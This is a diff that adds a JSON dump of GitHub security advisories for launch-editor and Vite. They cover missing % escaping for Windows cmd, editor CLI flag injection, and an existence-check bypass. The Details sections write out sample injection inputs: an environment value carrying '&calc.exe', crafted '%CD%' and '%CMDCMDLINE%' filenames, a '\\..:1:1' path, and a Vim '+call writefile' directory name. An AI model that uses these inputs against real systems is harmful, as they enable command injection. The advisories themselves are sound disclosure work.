@@ -1,0 +1,2001 @@
+﻿[
+    {
+        "status":  200,
+        "url":  "https://api.github.com/repos/vitejs/launch-editor/security-advisories/GHSA-698v-4r3x-3vcv",
+        "data":  {
+                     "ghsa_id":  "GHSA-698v-4r3x-3vcv",
+                     "cve_id":  "CVE-2026-112943",
+                     "url":  "https://api.github.com/repos/vitejs/launch-editor/security-advisories/GHSA-698v-4r3x-3vcv",
+                     "html_url":  "https://github.com/vitejs/launch-editor/security/advisories/GHSA-698v-4r3x-3vcv",
+                     "summary":  "escapeCmdArgs() omits % escaping on Windows",
+                     "description":  "### Summary\r\n\r\n`launch-editor` did not escape `%` on Windows when passing an argument to `cmd`. When an environment variable contained a malicious value, it was possible that that content to be executed.\r\n\r\n### Impact\r\n\r\nOnly apps that match all of the following conditions are affected:\r\n\r\n- The user uses Windows\r\n- An attacker can place a file with the malicious filename containing `\u0026` or `%`\r\n- Either of\r\n  - An attacker can inject an environment variable with a malicious value\r\n  - An attacker can add a NTFS alternate data stream to the file placed\r\n\r\n### Details\r\n\r\nUnlike `.sh` files, `.bat` / `.cmd` files on Windows cannot be called directly using [`child_process.spawn`](https://nodejs.org/docs/latest-v24.x/api/child_process.html#child_processspawncommand-args-options) and requires passing them as an argument of `cmd.exe`. To do so, launch-editor escapes the arguments passed to `cmd.exe`. But `launch-editor` did not escape `%` which is used for environment variables.\r\n\r\nBecause `launch-editor` checks if the argument matches an existing filename, the attack requires the attacker to be able to place a file.\r\n\r\n- If the attacker can inject an environment variable as well, they can include the subcommand in the env variable (e.g. set ` \u0026calc.exe ` to `%ENV%`) and call `launchEditor` with `something%ENV%`.\r\n- If the attacker can place a NTFS alternate data stream to the file (e.g. a NTFS alternate data stream named `~-38%calc.exe`), they can call `launchEditor` with `something %CMDCMDLINE:~-38%calc.exe`.\r\n- If the attacker can create a filename containing the `%CD%` and the subcommand (e.g. `\u0026calc.exe `), they can call `launchEditor` with `./%CD%`\r\n\r\n\r\n",
+                     "severity":  "medium",
+                     "author":  null,
+                     "publisher":  {
+                                       "login":  "sapphi-red",
+                                       "id":  49056869,
+                                       "node_id":  "MDQ6VXNlcjQ5MDU2ODY5",
+                                       "avatar_url":  "https://avatars.githubusercontent.com/u/49056869?v=4",
+                                       "gravatar_id":  "",
+                                       "url":  "https://api.github.com/users/sapphi-red",
+                                       "html_url":  "https://github.com/sapphi-red",
+                                       "followers_url":  "https://api.github.com/users/sapphi-red/followers",
+                                       "following_url":  "https://api.github.com/users/sapphi-red/following{/other_user}",
+                                       "gists_url":  "https://api.github.com/users/sapphi-red/gists{/gist_id}",
+                                       "starred_url":  "https://api.github.com/users/sapphi-red/starred{/owner}{/repo}",
+                                       "subscriptions_url":  "https://api.github.com/users/sapphi-red/subscriptions",
+                                       "organizations_url":  "https://api.github.com/users/sapphi-red/orgs",
+                                       "repos_url":  "https://api.github.com/users/sapphi-red/repos",
+                                       "events_url":  "https://api.github.com/users/sapphi-red/events{/privacy}",
+                                       "received_events_url":  "https://api.github.com/users/sapphi-red/received_events",
+                                       "type":  "User",
+                                       "user_view_type":  "public",
+                                       "site_admin":  false
+                                   },
+                     "identifiers":  [
+                                         {
+                                             "value":  "GHSA-698v-4r3x-3vcv",
+                                             "type":  "GHSA"
+                                         },
+                                         {
+                                             "value":  "CVE-2026-112943",
+                                             "type":  "CVE"
+                                         }
+                                     ],
+                     "state":  "published",
+                     "created_at":  null,
+                     "updated_at":  "2026-10-20T14:51:22Z",
+                     "published_at":  "2026-10-06T14:15:27Z",
+                     "closed_at":  null,
+                     "withdrawn_at":  null,
+                     "submission":  null,
+                     "vulnerabilities":  [
+                                             {
+                                                 "package":  {
+                                                                 "ecosystem":  "npm",
+                                                                 "name":  "launch-editor"
+                                                             },
+                                                 "vulnerable_version_range":  "\u003c= 2.14.1",
+                                                 "patched_versions":  "2.14.2",
+                                                 "vulnerable_functions":  [
+
+                                                                          ]
+                                             },
+                                             {
+                                                 "package":  {
+                                                                 "ecosystem":  "npm",
+                                                                 "name":  "vite"
+                                                             },
+                                                 "vulnerable_version_range":  "\u003e=8.3.0,\u003c=8.3.2",
+                                                 "patched_versions":  "8.3.3",
+                                                 "vulnerable_functions":  [
+
+                                                                          ]
+                                             },
+                                             {
+                                                 "package":  {
+                                                                 "ecosystem":  "npm",
+                                                                 "name":  "vite"
+                                                             },
+                                                 "vulnerable_version_range":  "\u003e=8.2.0,\u003c=8.2.3",
+                                                 "patched_versions":  "8.2.4",
+                                                 "vulnerable_functions":  [
+
+                                                                          ]
+                                             },
+                                             {
+                                                 "package":  {
+                                                                 "ecosystem":  "npm",
+                                                                 "name":  "vite"
+                                                             },
+                                                 "vulnerable_version_range":  "\u003e=8.0.0,\u003c=8.1.5",
+                                                 "patched_versions":  "8.1.6",
+                                                 "vulnerable_functions":  [
+
+                                                                          ]
+                                             },
+                                             {
+                                                 "package":  {
+                                                                 "ecosystem":  "npm",
+                                                                 "name":  "vite"
+                                                             },
+                                                 "vulnerable_version_range":  "\u003e=7.0.0,\u003c=7.3.6",
+                                                 "patched_versions":  "7.3.7",
+                                                 "vulnerable_functions":  [
+
+                                                                          ]
+                                             },
+                                             {
+                                                 "package":  {
+                                                                 "ecosystem":  "npm",
+                                                                 "name":  "vite"
+                                                             },
+                                                 "vulnerable_version_range":  "\u003c=6.4.3",
+                                                 "patched_versions":  "6.4.4",
+                                                 "vulnerable_functions":  [
+
+                                                                          ]
+                                             },
+                                             {
+                                                 "package":  {
+                                                                 "ecosystem":  "npm",
+                                                                 "name":  "vite-plus"
+                                                             },
+                                                 "vulnerable_version_range":  "\u003c=1.0.0",
+                                                 "patched_versions":  "1.1.0",
+                                                 "vulnerable_functions":  [
+
+                                                                          ]
+                                             }
+                                         ],
+                     "cvss_severities":  {
+                                             "cvss_v3":  {
+                                                             "vector_string":  null,
+                                                             "score":  null
+                                                         },
+                                             "cvss_v4":  {
+                                                             "vector_string":  "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:L/VI:L/VA:L/SC:N/SI:N/SA:N",
+                                                             "score":  6.3
+                                                         }
+                                         },
+                     "cwes":  [
+
+                              ],
+                     "cwe_ids":  [
+
+                                 ],
+                     "credits":  [
+                                     {
+                                         "login":  "iaohkut-from-NightWolf-Team",
+                                         "type":  "reporter"
+                                     },
+                                     {
+                                         "login":  "the-vibe-dev",
+                                         "type":  "reporter"
+                                     },
+                                     {
+                                         "login":  "Rikuxx0",
+                                         "type":  "reporter"
+                                     },
+                                     {
+                                         "login":  "bluwy",
+                                         "type":  "remediation_reviewer"
+                                     }
+                                 ],
+                     "credits_detailed":  [
+                                              {
+                                                  "user":  {
+                                                               "login":  "iaohkut-from-NightWolf-Team",
+                                                               "id":  286391906,
+                                                               "node_id":  "U_kgDOERH-Yg",
+                                                               "avatar_url":  "https://avatars.githubusercontent.com/u/286391906?v=4",
+                                                               "gravatar_id":  "",
+                                                               "url":  "https://api.github.com/users/iaohkut-from-NightWolf-Team",
+                                                               "html_url":  "https://github.com/iaohkut-from-NightWolf-Team",
+                                                               "followers_url":  "https://api.github.com/users/iaohkut-from-NightWolf-Team/followers",
+                                                               "following_url":  "https://api.github.com/users/iaohkut-from-NightWolf-Team/following{/other_user}",
+                                                               "gists_url":  "https://api.github.com/users/iaohkut-from-NightWolf-Team/gists{/gist_id}",
+                                                               "starred_url":  "https://api.github.com/users/iaohkut-from-NightWolf-Team/starred{/owner}{/repo}",
+                                                               "subscriptions_url":  "https://api.github.com/users/iaohkut-from-NightWolf-Team/subscriptions",
+                                                               "organizations_url":  "https://api.github.com/users/iaohkut-from-NightWolf-Team/orgs",
+                                                               "repos_url":  "https://api.github.com/users/iaohkut-from-NightWolf-Team/repos",
+                                                               "events_url":  "https://api.github.com/users/iaohkut-from-NightWolf-Team/events{/privacy}",
+                                                               "received_events_url":  "https://api.github.com/users/iaohkut-from-NightWolf-Team/received_events",
+                                                               "type":  "User",
+                                                               "user_view_type":  "public",
+                                                               "site_admin":  false
+                                                           },
+                                                  "type":  "reporter",
+                                                  "state":  "accepted"
+                                              },
+                                              {
+                                                  "user":  {
+                                                               "login":  "the-vibe-dev",
+                                                               "id":  38411158,
+                                                               "node_id":  "MDQ6VXNlcjM4NDExMTU4",
+                                                               "avatar_url":  "https://avatars.githubusercontent.com/u/38411158?v=4",
+                                                               "gravatar_id":  "",
+                                                               "url":  "https://api.github.com/users/the-vibe-dev",
+                                                               "html_url":  "https://github.com/the-vibe-dev",
+                                                               "followers_url":  "https://api.github.com/users/the-vibe-dev/followers",
+                                                               "following_url":  "https://api.github.com/users/the-vibe-dev/following{/other_user}",
+                                                               "gists_url":  "https://api.github.com/users/the-vibe-dev/gists{/gist_id}",
+                                                               "starred_url":  "https://api.github.com/users/the-vibe-dev/starred{/owner}{/repo}",
+                                                               "subscriptions_url":  "https://api.github.com/users/the-vibe-dev/subscriptions",
+                                                               "organizations_url":  "https://api.github.com/users/the-vibe-dev/orgs",
+                                                               "repos_url":  "https://api.github.com/users/the-vibe-dev/repos",
+                                                               "events_url":  "https://api.github.com/users/the-vibe-dev/events{/privacy}",
+                                                               "received_events_url":  "https://api.github.com/users/the-vibe-dev/received_events",
+                                                               "type":  "User",
+                                                               "user_view_type":  "public",
+                                                               "site_admin":  false
+                                                           },
+                                                  "type":  "reporter",
+                                                  "state":  "accepted"
+                                              },
+                                              {
+                                                  "user":  {
+                                                               "login":  "Rikuxx0",
+                                                               "id":  138118002,
+                                                               "node_id":  "U_kgDOCDuDcg",
+                                                               "avatar_url":  "https://avatars.githubusercontent.com/u/138118002?v=4",
+                                                               "gravatar_id":  "",
+                                                               "url":  "https://api.github.com/users/Rikuxx0",
+                                                               "html_url":  "https://github.com/Rikuxx0",
+                                                               "followers_url":  "https://api.github.com/users/Rikuxx0/followers",
+                                                               "following_url":  "https://api.github.com/users/Rikuxx0/following{/other_user}",
+                                                               "gists_url":  "https://api.github.com/users/Rikuxx0/gists{/gist_id}",
+                                                               "starred_url":  "https://api.github.com/users/Rikuxx0/starred{/owner}{/repo}",
+                                                               "subscriptions_url":  "https://api.github.com/users/Rikuxx0/subscriptions",
+                                                               "organizations_url":  "https://api.github.com/users/Rikuxx0/orgs",
+                                                               "repos_url":  "https://api.github.com/users/Rikuxx0/repos",
+                                                               "events_url":  "https://api.github.com/users/Rikuxx0/events{/privacy}",
+                                                               "received_events_url":  "https://api.github.com/users/Rikuxx0/received_events",
+                                                               "type":  "User",
+                                                               "user_view_type":  "public",
+                                                               "site_admin":  false
+                                                           },
+                                                  "type":  "reporter",
+                                                  "state":  "accepted"
+                                              },
+                                              {
+                                                  "user":  {
+                                                               "login":  "bluwy",
+                                                               "id":  34116392,
+                                                               "node_id":  "MDQ6VXNlcjM0MTE2Mzky",
+                                                               "avatar_url":  "https://avatars.githubusercontent.com/u/34116392?v=4",
+                                                               "gravatar_id":  "",
+                                                               "url":  "https://api.github.com/users/bluwy",
+                                                               "html_url":  "https://github.com/bluwy",
+                                                               "followers_url":  "https://api.github.com/users/bluwy/followers",
+                                                               "following_url":  "https://api.github.com/users/bluwy/following{/other_user}",
+                                                               "gists_url":  "https://api.github.com/users/bluwy/gists{/gist_id}",
+                                                               "starred_url":  "https://api.github.com/users/bluwy/starred{/owner}{/repo}",
+                                                               "subscriptions_url":  "https://api.github.com/users/bluwy/subscriptions",
+                                                               "organizations_url":  "https://api.github.com/users/bluwy/orgs",
+                                                               "repos_url":  "https://api.github.com/users/bluwy/repos",
+                                                               "events_url":  "https://api.github.com/users/bluwy/events{/privacy}",
+                                                               "received_events_url":  "https://api.github.com/users/bluwy/received_events",
+                                                               "type":  "User",
+                                                               "user_view_type":  "public",
+                                                               "site_admin":  false
+                                                           },
+                                                  "type":  "remediation_reviewer",
+                                                  "state":  "accepted"
+                                              }
+                                          ],
+                     "collaborating_users":  null,
+                     "collaborating_teams":  null,
+                     "private_fork":  null,
+                     "comments":  2,
+                     "cvss":  {
+                                  "vector_string":  null,
+                                  "score":  null
+                              }
+                 },
+        "retrievedUtc":  "2026-11-16T14:30:46.1195185Z"
+    },
+    {
+        "status":  200,
+        "url":  "https://api.github.com/repos/vitejs/launch-editor/security-advisories/GHSA-r825-w8mm-5pxw",
+        "data":  {
+                     "ghsa_id":  "GHSA-r825-w8mm-5pxw",
+                     "cve_id":  "CVE-2026-112944",
+                     "url":  "https://api.github.com/repos/vitejs/launch-editor/security-advisories/GHSA-r825-w8mm-5pxw",
+                     "html_url":  "https://github.com/vitejs/launch-editor/security/advisories/GHSA-r825-w8mm-5pxw",
+                     "summary":  "Editor CLI flag misinterpretation causing arbitrary command execution for some editors",
+                     "description":  "### Summary\r\n\r\n`launch-editor` forwarded file paths directly to editors without sanitization. If a path resembles a CLI flag, editors like Vim may interpret it as a command, potentially causing unintended file overwrites or command execution.\r\n\r\n### Impact\r\n\r\n#### Direct `launch-editor` users\r\n\r\nOnly apps that match all of the following conditions are affected:\r\n\r\n- The attacker is able to create a file system entry (e.g. a file or directory) starting with `+` or `-` in the working directory\r\n- The user uses or the app specifies any of the following editors:\r\n  - Vim (including gVim)\r\n  - MacVim\r\n  - Emacs (including Emacsclient)\r\n  - Notepad++ (only if using a plugin exposing dangerous operations via plugin messages)\r\n- The first argument of `launchEditor` can start with `+` or `-` or the user is using WSL\r\n\r\n#### `launch-editor-middleware` users\r\n\r\nOnly apps that match the following conditions are affected:\r\n\r\n- The attacker is able to create a file system entry (e.g. a file or directory) starting with `+` or `-` in the working directory\r\n- The user uses or the app specifies any of the following editors:\r\n  - Vim (including gVim)\r\n  - MacVim\r\n  - Emacs (including Emacsclient)\r\n  - Notepad++ (only if using a plugin exposing dangerous operations via plugin messages)\r\n- launch-editor older than v2.2.0 is used, or the user is using WSL\r\n\r\n#### Vite users\r\n\r\nOnly apps that match the following conditions are affected:\r\n\r\n- The attacker is able to create a file system entry (e.g. a file or directory) starting with `+` or `-` in the working directory\r\n- The user uses or the app specifies any of the following editors:\r\n  - Vim (including gVim)\r\n  - MacVim\r\n  - Emacs (including Emacsclient)\r\n  - Notepad++ (only if using a plugin exposing dangerous operations via plugin messages)\r\n- The user is using WSL\r\n\r\n### Details\r\n\r\n`launchEditor(file)` function passes the file name as-is to the editor if the file with that file name exists. If the file name starts with `-` (also `+` for Vim), the editor treats them as flags rather than positional arguments. For example, Vim treats arguments starting with `+` as an Ex command. As a result, an existing relative directory such as:\r\n```\r\n+call writefile([\"SAFE_MARKER\"],\"LAUNCH_EDITOR_MARKER\")|qa!\r\n```\r\nis not treated as a filename when passed to Vim. Vim executes the embedded Ex command.\r\n\r\nThe following editor has a potentially destructive operation exposed to the CLI arguments:\r\n- Vim (including gVim)\r\n- MacVim\r\n- Emacs (including Emacsclient)\r\n- Notepad++ (only if using a plugin exposing dangerous operations via plugin messages)\r\n\r\n`launch-editor-middleware` v2.2.0+ converts the passed file path to an absolute path so those are not affected as long as the user is not using WSL. For WSL, `launch-editor` converts the paths to relative paths internally, so those are still affected.\r\n\r\nVite 2.0.0+ uses `launch-editor-middleware` v2.2.0+ so the WSL users are only affected.\r\n",
+                     "severity":  "medium",
+                     "author":  null,
+                     "publisher":  {
+                                       "login":  "sapphi-red",
+                                       "id":  49056869,
+                                       "node_id":  "MDQ6VXNlcjQ5MDU2ODY5",
+                                       "avatar_url":  "https://avatars.githubusercontent.com/u/49056869?v=4",
+                                       "gravatar_id":  "",
+                                       "url":  "https://api.github.com/users/sapphi-red",
+                                       "html_url":  "https://github.com/sapphi-red",
+                                       "followers_url":  "https://api.github.com/users/sapphi-red/followers",
+                                       "following_url":  "https://api.github.com/users/sapphi-red/following{/other_user}",
+                                       "gists_url":  "https://api.github.com/users/sapphi-red/gists{/gist_id}",
+                                       "starred_url":  "https://api.github.com/users/sapphi-red/starred{/owner}{/repo}",
+                                       "subscriptions_url":  "https://api.github.com/users/sapphi-red/subscriptions",
+                                       "organizations_url":  "https://api.github.com/users/sapphi-red/orgs",
+                                       "repos_url":  "https://api.github.com/users/sapphi-red/repos",
+                                       "events_url":  "https://api.github.com/users/sapphi-red/events{/privacy}",
+                                       "received_events_url":  "https://api.github.com/users/sapphi-red/received_events",
+                                       "type":  "User",
+                                       "user_view_type":  "public",
+                                       "site_admin":  false
+                                   },
+                     "identifiers":  [
+                                         {
+                                             "value":  "GHSA-r825-w8mm-5pxw",
+                                             "type":  "GHSA"
+                                         },
+                                         {
+                                             "value":  "CVE-2026-112944",
+                                             "type":  "CVE"
+                                         }
+                                     ],
+                     "state":  "published",
+                     "created_at":  null,
+                     "updated_at":  "2026-10-20T14:55:42Z",
+                     "published_at":  "2026-10-06T14:15:20Z",
+                     "closed_at":  null,
+                     "withdrawn_at":  null,
+                     "submission":  null,
+                     "vulnerabilities":  [
+                                             {
+                                                 "package":  {
+                                                                 "ecosystem":  "npm",
+                                                                 "name":  "launch-editor"
+                                                             },
+                                                 "vulnerable_version_range":  "\u003c=2.14.1",
+                                                 "patched_versions":  "2.14.2",
+                                                 "vulnerable_functions":  [
+
+                                                                          ]
+                                             },
+                                             {
+                                                 "package":  {
+                                                                 "ecosystem":  "npm",
+                                                                 "name":  "vite"
+                                                             },
+                                                 "vulnerable_version_range":  "\u003e=8.3.0,\u003c=8.3.2",
+                                                 "patched_versions":  "8.3.3",
+                                                 "vulnerable_functions":  [
+
+                                                                          ]
+                                             },
+                                             {
+                                                 "package":  {
+                                                                 "ecosystem":  "npm",
+                                                                 "name":  "vite"
+                                                             },
+                                                 "vulnerable_version_range":  "\u003e=8.2.0,\u003c=8.2.3",
+                                                 "patched_versions":  "8.2.4",
+                                                 "vulnerable_functions":  [
+
+                                                                          ]
+                                             },
+                                             {
+                                                 "package":  {
+                                                                 "ecosystem":  "npm",
+                                                                 "name":  "vite"
+                                                             },
+                                                 "vulnerable_version_range":  "\u003e=8.0.0,\u003c=8.1.5",
+                                                 "patched_versions":  "8.1.6",
+                                                 "vulnerable_functions":  [
+
+                                                                          ]
+                                             },
+                                             {
+                                                 "package":  {
+                                                                 "ecosystem":  "npm",
+                                                                 "name":  "vite"
+                                                             },
+                                                 "vulnerable_version_range":  "\u003e=7.0.0,\u003c=7.3.6",
+                                                 "patched_versions":  "7.3.7",
+                                                 "vulnerable_functions":  [
+
+                                                                          ]
+                                             },
+                                             {
+                                                 "package":  {
+                                                                 "ecosystem":  "npm",
+                                                                 "name":  "vite"
+                                                             },
+                                                 "vulnerable_version_range":  "\u003c=6.4.3",
+                                                 "patched_versions":  "6.4.4",
+                                                 "vulnerable_functions":  [
+
+                                                                          ]
+                                             },
+                                             {
+                                                 "package":  {
+                                                                 "ecosystem":  "npm",
+                                                                 "name":  "vite-plus"
+                                                             },
+                                                 "vulnerable_version_range":  "\u003c=1.0.0",
+                                                 "patched_versions":  "1.1.0",
+                                                 "vulnerable_functions":  [
+
+                                                                          ]
+                                             }
+                                         ],
+                     "cvss_severities":  {
+                                             "cvss_v3":  {
+                                                             "vector_string":  null,
+                                                             "score":  null
+                                                         },
+                                             "cvss_v4":  {
+                                                             "vector_string":  "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:L/VI:L/VA:L/SC:N/SI:N/SA:N",
+                                                             "score":  6.3
+                                                         }
+                                         },
+                     "cwes":  [
+                                  {
+                                      "cwe_id":  "CWE-88",
+                                      "name":  "Improper Neutralization of Argument Delimiters in a Command"
+                                  }
+                              ],
+                     "cwe_ids":  [
+                                     "CWE-88"
+                                 ],
+                     "credits":  [
+                                     {
+                                         "login":  "0xazanul",
+                                         "type":  "reporter"
+                                     },
+                                     {
+                                         "login":  "bluwy",
+                                         "type":  "remediation_reviewer"
+                                     }
+                                 ],
+                     "credits_detailed":  [
+                                              {
+                                                  "user":  {
+                                                               "login":  "0xazanul",
+                                                               "id":  181333222,
+                                                               "node_id":  "U_kgDOCs7s5g",
+                                                               "avatar_url":  "https://avatars.githubusercontent.com/u/181333222?v=4",
+                                                               "gravatar_id":  "",
+                                                               "url":  "https://api.github.com/users/0xazanul",
+                                                               "html_url":  "https://github.com/0xazanul",
+                                                               "followers_url":  "https://api.github.com/users/0xazanul/followers",
+                                                               "following_url":  "https://api.github.com/users/0xazanul/following{/other_user}",
+                                                               "gists_url":  "https://api.github.com/users/0xazanul/gists{/gist_id}",
+                                                               "starred_url":  "https://api.github.com/users/0xazanul/starred{/owner}{/repo}",
+                                                               "subscriptions_url":  "https://api.github.com/users/0xazanul/subscriptions",
+                                                               "organizations_url":  "https://api.github.com/users/0xazanul/orgs",
+                                                               "repos_url":  "https://api.github.com/users/0xazanul/repos",
+                                                               "events_url":  "https://api.github.com/users/0xazanul/events{/privacy}",
+                                                               "received_events_url":  "https://api.github.com/users/0xazanul/received_events",
+                                                               "type":  "User",
+                                                               "user_view_type":  "public",
+                                                               "site_admin":  false
+                                                           },
+                                                  "type":  "reporter",
+                                                  "state":  "accepted"
+                                              },
+                                              {
+                                                  "user":  {
+                                                               "login":  "bluwy",
+                                                               "id":  34116392,
+                                                               "node_id":  "MDQ6VXNlcjM0MTE2Mzky",
+                                                               "avatar_url":  "https://avatars.githubusercontent.com/u/34116392?v=4",
+                                                               "gravatar_id":  "",
+                                                               "url":  "https://api.github.com/users/bluwy",
+                                                               "html_url":  "https://github.com/bluwy",
+                                                               "followers_url":  "https://api.github.com/users/bluwy/followers",
+                                                               "following_url":  "https://api.github.com/users/bluwy/following{/other_user}",
+                                                               "gists_url":  "https://api.github.com/users/bluwy/gists{/gist_id}",
+                                                               "starred_url":  "https://api.github.com/users/bluwy/starred{/owner}{/repo}",
+                                                               "subscriptions_url":  "https://api.github.com/users/bluwy/subscriptions",
+                                                               "organizations_url":  "https://api.github.com/users/bluwy/orgs",
+                                                               "repos_url":  "https://api.github.com/users/bluwy/repos",
+                                                               "events_url":  "https://api.github.com/users/bluwy/events{/privacy}",
+                                                               "received_events_url":  "https://api.github.com/users/bluwy/received_events",
+                                                               "type":  "User",
+                                                               "user_view_type":  "public",
+                                                               "site_admin":  false
+                                                           },
+                                                  "type":  "remediation_reviewer",
+                                                  "state":  "accepted"
+                                              }
+                                          ],
+                     "collaborating_users":  null,
+                     "collaborating_teams":  null,
+                     "private_fork":  null,
+                     "comments":  6,
+                     "cvss":  {
+                                  "vector_string":  null,
+                                  "score":  null
+                              }
+                 },
+        "retrievedUtc":  "2026-11-16T14:30:46.4892117Z"
+    },
+    {
+        "status":  200,
+        "url":  "https://api.github.com/repos/vitejs/launch-editor/security-advisories/GHSA-587h-7wmj-h5pm",
+        "data":  {
+                     "ghsa_id":  "GHSA-587h-7wmj-h5pm",
+                     "cve_id":  "CVE-2026-112942",
+                     "url":  "https://api.github.com/repos/vitejs/launch-editor/security-advisories/GHSA-587h-7wmj-h5pm",
+                     "html_url":  "https://github.com/vitejs/launch-editor/security/advisories/GHSA-587h-7wmj-h5pm",
+                     "summary":  "`fs.existsSync()` existence check can be bypassed on Windows",
+                     "description":  "### Summary\r\n\r\n`launch-editor` checked `fs.existsSync(fileName)` before passing a supplied path to an editor command. On Windows, an attacker can bypass this check with a crafted path ending in `\\\\..:line:column`. This removes the requirement that the attacker be able to place a file with a malicious filename.\r\n\r\nCombined with the `%` escaping issue described in [GHSA-698v-4r3x-3vcv](https://github.com/vitejs/launch-editor/security/advisories/GHSA-698v-4r3x-3vcv), this bypass can lead to OS command injection when an attacker controls the file argument.\r\n\r\n### Impact\r\n\r\nOnly apps that runs on Windows is affected.\r\n\r\n### Details\r\n\r\nThe earlier advisory assumed that `fs.existsSync()` required an attacker-controlled filename to exist. This advisory covers a bypass of that requirement.\r\n\r\nA crafted value ending in `\\\\..:1:1` is interpreted differently by `launch-editor-middleware`, `launch-editor`, and Windows:\r\n\r\n1. `launch-editor-middleware` calls `path.resolve()` while the final path component is `..:1:1`, so it is not treated as a parent-directory component.\r\n2. `launch-editor` treats `:1:1` as a line-and-column suffix and removes it, leaving a path ending in `\\\\..`.\r\n3. On Windows, `fs.existsSync()` accepts the resulting path as the existing parent directory even though the attacker-controlled preceding component does not exist.\r\n4. Because the existence check passes, the crafted filename reaches the Windows shell command.\r\n\r\n",
+                     "severity":  "high",
+                     "author":  null,
+                     "publisher":  {
+                                       "login":  "sapphi-red",
+                                       "id":  49056869,
+                                       "node_id":  "MDQ6VXNlcjQ5MDU2ODY5",
+                                       "avatar_url":  "https://avatars.githubusercontent.com/u/49056869?v=4",
+                                       "gravatar_id":  "",
+                                       "url":  "https://api.github.com/users/sapphi-red",
+                                       "html_url":  "https://github.com/sapphi-red",
+                                       "followers_url":  "https://api.github.com/users/sapphi-red/followers",
+                                       "following_url":  "https://api.github.com/users/sapphi-red/following{/other_user}",
+                                       "gists_url":  "https://api.github.com/users/sapphi-red/gists{/gist_id}",
+                                       "starred_url":  "https://api.github.com/users/sapphi-red/starred{/owner}{/repo}",
+                                       "subscriptions_url":  "https://api.github.com/users/sapphi-red/subscriptions",
+                                       "organizations_url":  "https://api.github.com/users/sapphi-red/orgs",
+                                       "repos_url":  "https://api.github.com/users/sapphi-red/repos",
+                                       "events_url":  "https://api.github.com/users/sapphi-red/events{/privacy}",
+                                       "received_events_url":  "https://api.github.com/users/sapphi-red/received_events",
+                                       "type":  "User",
+                                       "user_view_type":  "public",
+                                       "site_admin":  false
+                                   },
+                     "identifiers":  [
+                                         {
+                                             "value":  "GHSA-587h-7wmj-h5pm",
+                                             "type":  "GHSA"
+                                         },
+                                         {
+                                             "value":  "CVE-2026-112942",
+                                             "type":  "CVE"
+                                         }
+                                     ],
+                     "state":  "published",
+                     "created_at":  null,
+                     "updated_at":  "2026-10-20T14:44:26Z",
+                     "published_at":  "2026-10-06T14:15:17Z",
+                     "closed_at":  null,
+                     "withdrawn_at":  null,
+                     "submission":  null,
+                     "vulnerabilities":  [
+                                             {
+                                                 "package":  {
+                                                                 "ecosystem":  "npm",
+                                                                 "name":  "launch-editor"
+                                                             },
+                                                 "vulnerable_version_range":  "\u003c= 2.14.1",
+                                                 "patched_versions":  "2.14.2",
+                                                 "vulnerable_functions":  [
+
+                                                                          ]
+                                             },
+                                             {
+                                                 "package":  {
+                                                                 "ecosystem":  "npm",
+                                                                 "name":  "vite"
+                                                             },
+                                                 "vulnerable_version_range":  "\u003e=8.3.0,\u003c=8.3.2",
+                                                 "patched_versions":  "8.3.3",
+                                                 "vulnerable_functions":  [
+
+                                                                          ]
+                                             },
+                                             {
+                                                 "package":  {
+                                                                 "ecosystem":  "npm",
+                                                                 "name":  "vite"
+                                                             },
+                                                 "vulnerable_version_range":  "\u003e=8.2.0,\u003c=8.2.3",
+                                                 "patched_versions":  "8.2.4",
+                                                 "vulnerable_functions":  [
+
+                                                                          ]
+                                             },
+                                             {
+                                                 "package":  {
+                                                                 "ecosystem":  "npm",
+                                                                 "name":  "vite"
+                                                             },
+                                                 "vulnerable_version_range":  "\u003e=8.0.0,\u003c=8.1.5",
+                                                 "patched_versions":  "8.1.6",
+                                                 "vulnerable_functions":  [
+
+                                                                          ]
+                                             },
+                                             {
+                                                 "package":  {
+                                                                 "ecosystem":  "npm",
+                                                                 "name":  "vite"
+                                                             },
+                                                 "vulnerable_version_range":  "\u003e=7.0.0,\u003c=7.3.6",
+                                                 "patched_versions":  "7.3.7",
+                                                 "vulnerable_functions":  [
+
+                                                                          ]
+                                             },
+                                             {
+                                                 "package":  {
+                                                                 "ecosystem":  "npm",
+                                                                 "name":  "vite"
+                                                             },
+                                                 "vulnerable_version_range":  "\u003c=6.4.3",
+                                                 "patched_versions":  "6.4.4",
+                                                 "vulnerable_functions":  [
+
+                                                                          ]
+                                             },
+                                             {
+                                                 "package":  {
+                                                                 "ecosystem":  "npm",
+                                                                 "name":  "vite-plus"
+                                                             },
+                                                 "vulnerable_version_range":  "\u003c=1.0.0",
+                                                 "patched_versions":  "1.1.0",
+                                                 "vulnerable_functions":  [
+
+                                                                          ]
+                                             }
+                                         ],
+                     "cvss_severities":  {
+                                             "cvss_v3":  {
+                                                             "vector_string":  null,
+                                                             "score":  null
+                                                         },
+                                             "cvss_v4":  {
+                                                             "vector_string":  "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:A/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N",
+                                                             "score":  7.5
+                                                         }
+                                         },
+                     "cwes":  [
+                                  {
+                                      "cwe_id":  "CWE-77",
+                                      "name":  "Improper Neutralization of Special Elements used in a Command"
+                                  }
+                              ],
+                     "cwe_ids":  [
+                                     "CWE-77"
+                                 ],
+                     "credits":  [
+                                     {
+                                         "login":  "hutsbotnet",
+                                         "type":  "reporter"
+                                     },
+                                     {
+                                         "login":  "bluwy",
+                                         "type":  "remediation_reviewer"
+                                     }
+                                 ],
+                     "credits_detailed":  [
+                                              {
+                                                  "user":  {
+                                                               "login":  "hutsbotnet",
+                                                               "id":  215170620,
+                                                               "node_id":  "U_kgDODNM-PA",
+                                                               "avatar_url":  "https://avatars.githubusercontent.com/u/215170620?v=4",
+                                                               "gravatar_id":  "",
+                                                               "url":  "https://api.github.com/users/hutsbotnet",
+                                                               "html_url":  "https://github.com/hutsbotnet",
+                                                               "followers_url":  "https://api.github.com/users/hutsbotnet/followers",
+                                                               "following_url":  "https://api.github.com/users/hutsbotnet/following{/other_user}",
+                                                               "gists_url":  "https://api.github.com/users/hutsbotnet/gists{/gist_id}",
+                                                               "starred_url":  "https://api.github.com/users/hutsbotnet/starred{/owner}{/repo}",
+                                                               "subscriptions_url":  "https://api.github.com/users/hutsbotnet/subscriptions",
+                                                               "organizations_url":  "https://api.github.com/users/hutsbotnet/orgs",
+                                                               "repos_url":  "https://api.github.com/users/hutsbotnet/repos",
+                                                               "events_url":  "https://api.github.com/users/hutsbotnet/events{/privacy}",
+                                                               "received_events_url":  "https://api.github.com/users/hutsbotnet/received_events",
